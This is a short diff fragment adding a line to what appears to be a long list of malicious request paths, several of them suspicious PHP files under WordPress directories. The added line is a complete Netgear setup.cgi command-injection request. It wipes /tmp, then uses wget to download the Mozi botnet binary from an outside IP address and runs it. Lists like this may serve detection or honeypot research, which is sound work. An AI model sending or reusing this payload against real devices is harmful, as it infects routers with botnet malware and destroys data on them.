@@ -16230,3 +16230,4 @@ http://apiv4.9hits.com/test
 /wp-includes/mLpcFw1nju7.php
 /wp-includes/mKJz4ZXHoWF.php
 /wp-admin/includes/image-import.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.10.152.221:56726/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
